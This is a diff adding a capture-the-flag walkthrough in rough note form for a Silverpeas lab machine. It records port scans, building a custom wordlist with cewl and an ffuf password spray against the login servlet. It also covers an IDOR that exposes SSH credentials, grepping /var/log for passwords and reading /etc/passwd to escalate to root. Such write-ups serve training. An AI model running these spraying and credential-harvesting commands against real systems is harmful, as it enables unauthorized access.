@@ -1,0 +1,80 @@
+
+*On doing nmap scan --> 3port opens
+
+--------------------------------------------------------------------------------------------------------------
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 16:10 IST
+Nmap scan report for 10.10.230.207
+Host is up (0.19s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+---------------------------------------------------------------------------------------------------------------
+
+*One visting the the web .. and find that the applicating uses the jQuery 3.6.0
+
+*rustscan
+-->sudo rustscan -a 10.10.230.207 --range 1-65535 --tries 3 --ulimit 5000 -- -A -sCV -Pn -r -n --reason --min-rate 2000 --disable-arp-ping
+
+---------------------------------------------------------------------------------------------------------------
+ The config file is expected to be at "/root/.rustscan.toml"
+[~] Automatically increasing ulimit value to 5000.
+Open 10.10.230.207:22
+Open 10.10.230.207:80
+Open 10.10.230.207:8080
+
+PORT     STATE SERVICE    REASON         VERSION
+22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http       syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Hack Smarter Security
+8080/tcp open  http-proxy syn-ack ttl 62
+|_http-title: Error
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Connection: close
+|     Content-Length: 74
+|     Content-Type: text/html
+|     Date: Thu, 23 Jan 2025 11:18:14 GMT
+
+
+-----------------------------------------------------------------------------------------------------------------
+* One exploring the web app i get the word Silverpeas and the username "scr1ptkiddy"
+
+* On search net 
+**Silverpeas** is a tool that helps people work together on projects. It's like a big online workspace where you can share documents, talk to each other, and organize tasks. People use it in schools and businesses to stay connected and get things done faster!
+
+* visiting the silverpeas.org --> documentation. I get defaut page http://localhost:8000/silverpeas with default username and pass SilverAdmin/Silver Admin
+* i visit http://target_ip:8000/silverpeas i get a login page 
+
+* It is clearly given that the rockyou will not be work.. We need to create the own custom wordlist.. For that i use cewl tool..
+-->sudo cewl -vv -d 10 --with-numbers --lowercase -m 8 http://10.10.230.207:80 -w custom.txt
+
+* Then i try to spay the passwords...using ffuz
+-->sudo ffuf -u 'http://10.10.230.207:8080/silverpeas/AuthenticationServlet' -w custom.txt:FUZZPASS -H 'Content-Type: application/x-www-form-urlencoded' -d 'Login=scr1ptkiddy&Password=FUZZPASS&DomainId=0' -X POST -r --rate 20 --replay-proxy http://10.10.230.207:8000 -fs 8282
+
+*I get the password ==> "adipiscing"
+
+*After logged in in the mail section... we have a unread mail... From here we can found the IDOR vulnerability .. so i change the id to 6..
+
+*I get the username and password for Ssh
+
+*After enter into the ssh --> user.txt got user flags
+
+*Now we need to get the root password... for that i check for /var/log file 
+--> grep -REi 'Password' /var/log/*
+
+*I found a DB_Password which repeat many times "_Zd_zx7N823/"
+
+*I check for the users 
+--> cat /etc/passwd | grep home 
+
+*I get two users tyler and tim.. Hence tyler is the root user.. So log in with password obtained..
+
+*The root.txt is found in the /root/root.text
+
+Hence cracked......
